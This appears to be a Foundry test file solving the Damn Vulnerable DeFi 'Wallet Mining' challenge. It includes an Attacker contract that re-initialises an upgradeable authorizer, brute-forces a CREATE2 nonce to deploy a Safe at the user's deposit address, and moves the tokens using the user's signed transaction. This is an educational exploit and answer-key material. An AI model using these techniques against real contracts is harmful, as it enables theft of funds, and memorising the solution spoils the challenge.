// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {Create2} from "@openzeppelin/contracts/utils/Create2.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {
    AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy
} from "../../src/wallet-mining/AuthorizerFactory.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";

contract WalletMiningChallenge is Test {
    address deployer = makeAddr("deployer");
    address upgrader = makeAddr("upgrader");
    address ward = makeAddr("ward");
    address player = makeAddr("player");
    address user;
    uint256 userPrivateKey;

    address constant USER_DEPOSIT_ADDRESS = 0x8be6a88D3871f793aD5D5e24eF39e1bf5be31d2b;
    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;

    address constant SAFE_SINGLETON_FACTORY_ADDRESS = 0x914d7Fec6aaC8cd542e72Bca78B30650d45643d7;
    bytes constant SAFE_SINGLETON_FACTORY_CODE =
        hex"7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe03601600081602082378035828234f58015156039578182fd5b8082525050506014600cf3";

    DamnValuableToken token;
    AuthorizerUpgradeable authorizer;
    WalletDeployer walletDeployer;
    SafeProxyFactory proxyFactory;
    Safe singletonCopy;

    uint256 initialWalletDeployerTokenBalance;
    enum Operation {
        Call,
        DelegateCall
    }

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Player should be able to use the user's private key
        (user, userPrivateKey) = makeAddrAndKey("user");

        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy authorizer with a ward authorized to deploy at DEPOSIT_ADDRESS
        address[] memory wards = new address[](1);
        wards[0] = ward;
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;
        AuthorizerFactory authorizerFactory = new AuthorizerFactory();
        authorizer = AuthorizerUpgradeable(authorizerFactory.deployWithProxy(wards, aims, upgrader));

        // Send big bag full of DVT tokens to the deposit address
        token.transfer(USER_DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Include Safe singleton factory in this chain
        vm.etch(SAFE_SINGLETON_FACTORY_ADDRESS, SAFE_SINGLETON_FACTORY_CODE);

        // Call singleton factory to deploy copy and factory contracts
        (bool success, bytes memory returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(Safe).creationCode));
        singletonCopy = Safe(payable(address(uint160(bytes20(returndata)))));

        (success, returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(SafeProxyFactory).creationCode));
        proxyFactory = SafeProxyFactory(address(uint160(bytes20(returndata))));

        // Deploy wallet deployer
        walletDeployer = new WalletDeployer(address(token), address(proxyFactory), address(singletonCopy));

        // Set authorizer in wallet deployer
        walletDeployer.rule(address(authorizer));

        // Fund wallet deployer with tokens
        initialWalletDeployerTokenBalance = walletDeployer.pay();
        token.transfer(address(walletDeployer), initialWalletDeployerTokenBalance);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Check initialization of authorizer
        assertNotEq(address(authorizer), address(0));
        assertEq(TransparentProxy(payable(address(authorizer))).upgrader(), upgrader);
        assertTrue(authorizer.can(ward, USER_DEPOSIT_ADDRESS));
        assertFalse(authorizer.can(player, USER_DEPOSIT_ADDRESS));

        // Check initialization of wallet deployer
        assertEq(walletDeployer.chief(), deployer);
        assertEq(walletDeployer.gem(), address(token));
        assertEq(walletDeployer.mom(), address(authorizer));

        // Ensure DEPOSIT_ADDRESS starts empty
        assertEq(USER_DEPOSIT_ADDRESS.code, hex"");

        // Factory and copy are deployed correctly
        assertEq(address(walletDeployer.cook()).code, type(SafeProxyFactory).runtimeCode, "bad cook code");
        assertEq(walletDeployer.cpy().code, type(Safe).runtimeCode, "no copy code");

        // Ensure initial token balances are set correctly
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), DEPOSIT_TOKEN_AMOUNT);
        assertGt(initialWalletDeployerTokenBalance, 0);
        assertEq(token.balanceOf(address(walletDeployer)), initialWalletDeployerTokenBalance);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */

    Attacker attackerContract;

    function testWalletMining() public checkSolvedByPlayer {
        uint256 targetNonce; // Variable to hold the nonce when the correct address is found

        // Setup wallet owners for the proxy initialization
        address[] memory walletOwners = new address[](1);
        walletOwners[0] = user;

        // Payload for wallet setup during proxy creation
        bytes memory setupPayload = abi.encodeWithSignature(
            "setup(address[],uint256,address,bytes,address,address,uint256,address)",
            walletOwners, // Wallet owners
            1,            // Threshold for multisig
            address(0),   // Fallback handler
            "",           // Initial transaction payload
            address(0),   // Payment token
            address(0),   // Payment receiver
            0,            // Payment amount
            address(0)    // Module manager
        );

        // Hash of the SafeProxy contract creation code and initializer
        bytes32 bytecodeHash = keccak256(
            abi.encodePacked(
                type(SafeProxy).creationCode, 
                uint256(uint160(address(singletonCopy)))
            )
        );

        // Loop to find the nonce that produces the desired address
        for (uint256 i = 0; i < 50; i++) {
            bytes32 salt = keccak256(abi.encodePacked(keccak256(setupPayload), i));
            address calculatedAddress = address(uint160(uint256(
                keccak256(abi.encodePacked(
                    bytes1(0xff),               // CREATE2 opcode
                    address(proxyFactory),      // Deployer address
                    salt,                       // Salt for CREATE2
                    bytecodeHash                // Proxy contract bytecode hash
                ))
            )));

            // If the calculated address matches the target address
            if (calculatedAddress == USER_DEPOSIT_ADDRESS) {
                targetNonce = i;
                break;
            }
        }
        console.log(targetNonce);

        require(targetNonce != 0, "Nonce not found");

        // Transaction data for transferring funds
        bytes memory transactionData = abi.encodeWithSignature(
            "transfer(address,uint256)", 
            user,                     // Recipient
            DEPOSIT_TOKEN_AMOUNT      // Amount to transfer
        );

        // Encode the transaction details for signing
        bytes memory encodedTransaction = abi.encode(
            0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8, // SafeTx hash
            address(token),           // Target contract (DamnValuableToken)
            0,                        // Value (0 for token transfer)
            keccak256(transactionData), // Keccak256 of the transaction payload
            uint8(0),                 // Operation type (call)
            0,                        // SafeTx gas
            0,                        // Base gas
            0,                        // Gas price
            address(0),               // Gas token
            address(0),               // Refund receiver
            0                         // Nonce
        );

        // Domain separator for EIP-712 signature
        bytes32 domainSeparator = keccak256(
            abi.encode(
                0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218, // EIP-712 domain hash
                block.chainid,          // Chain ID
                0x8be6a88D3871f793aD5D5e24eF39e1bf5be31d2b // Safe contract address
            )
        );

        // Calculate the transaction hash for signing
        bytes32 transactionHash = keccak256(
            abi.encodePacked(
                bytes1(0x19),           // EIP-191 prefix
                bytes1(0x01),           // Version byte
                domainSeparator,        // Domain separator
                keccak256(encodedTransaction) // Transaction hash
            )
        );

        // Sign the transaction hash
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, transactionHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        // Final payload to execute the transaction via the wallet
        bytes memory finalPayload = abi.encodeWithSignature(
            "execTransaction(address,uint256,bytes,uint8,uint256,uint256,uint256,address,address,bytes)", 
            address(token),           // Target contract
            0,                        // Value
            transactionData,          // Transaction data
            uint8(0),                 // Operation type
            0,                        // SafeTx gas
            0,                        // Base gas
            0,                        // Gas price
            address(0),               // Gas token
            address(0),               // Refund receiver
            signature                 // Signature
        );

        // Deploy the attacker contract
        attackerContract = new Attacker(
            user,                      // User address
            address(authorizer),       // Authorizer contract
            address(walletDeployer),   // WalletDeployer contract
            address(token),            // Token contract
            ward,           // Address to recover tokens
            finalPayload               // Final transaction payload
        );
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Factory account must have code
        assertNotEq(address(walletDeployer.cook()).code.length, 0, "No code at factory address");

        // Safe copy account must have code
        assertNotEq(walletDeployer.cpy().code.length, 0, "No code at copy address");

        // Deposit account must have code
        assertNotEq(USER_DEPOSIT_ADDRESS.code.length, 0, "No code at user's deposit address");

        // The deposit address and the wallet deployer must not hold tokens
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), 0, "User's deposit address still has tokens");
        assertEq(token.balanceOf(address(walletDeployer)), 0, "Wallet deployer contract still has tokens");

        // User account didn't execute any transactions
        assertEq(vm.getNonce(user), 0, "User executed a tx");

        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // Player recovered all tokens for the user
        assertEq(token.balanceOf(user), DEPOSIT_TOKEN_AMOUNT, "Not enough tokens in user's account");

        // Player sent payment to ward
        assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
    }
}

// Attacker contract used to exploit the WalletDeployer
contract Attacker {
    AuthorizerUpgradeable authorizer;
    WalletDeployer deployer;
    DamnValuableToken token;
    address targetWallet = 0x8be6a88D3871f793aD5D5e24eF39e1bf5be31d2b;

    constructor(
        address user, 
        address authorizerAddress, 
        address deployerAddress, 
        address tokenAddress, 
        address recoveryAddress, 
        bytes memory finalPayload
    ) {
        // Prepare the wallet setup payload
        address[] memory walletOwners = new address[](1);
        walletOwners[0] = user;
        bytes memory setupPayload = abi.encodeWithSignature(
            "setup(address[],uint256,address,bytes,address,address,uint256,address)",
            walletOwners, 1, address(0), "", address(0), address(0), 0, address(0)
        );

        // Authorizer configuration
        address[] memory authorizedWards = new address[](1);
        authorizedWards[0] = address(this);

        address[] memory authorizedTargets = new address[](1);
        authorizedTargets[0] = targetWallet;

        authorizer = AuthorizerUpgradeable(payable(authorizerAddress));
        authorizer.init(authorizedWards, authorizedTargets);

        // Deploy the proxy wallet
        deployer = WalletDeployer(deployerAddress);
        //13 is the nonce obtained from the loop we ran above in the test function.
        deployer.drop(targetWallet, setupPayload, 13);

        // Transfer tokens to the recovery address
        token = DamnValuableToken(tokenAddress);
        token.transfer(recoveryAddress, token.balanceOf(address(this)));

        // Execute the final transaction to recover tokens
        targetWallet.call(finalPayload);
    }
}
